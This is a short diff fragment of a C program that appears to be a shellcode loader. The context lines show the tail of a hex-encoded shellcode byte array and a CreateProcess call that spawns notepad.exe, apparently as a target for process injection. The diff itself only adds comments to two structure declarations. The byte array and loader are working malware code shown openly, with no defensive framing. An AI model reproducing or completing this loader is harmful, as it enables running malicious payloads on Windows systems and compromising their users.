@@ -59,8 +59,8 @@ int main()
         "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
         "\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
 
-    STARTUPINFO si = { sizeof(si) };
-    PROCESS_INFORMATION pi;
+    STARTUPINFO si = { sizeof(si) }; // Initialize the STARTUPINFO structure
+    PROCESS_INFORMATION pi; // Declare the PROCESS_INFORMATION structure
 
     if (!CreateProcess(TEXT("C:\\Windows\\System32\\notepad.exe"), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
     {
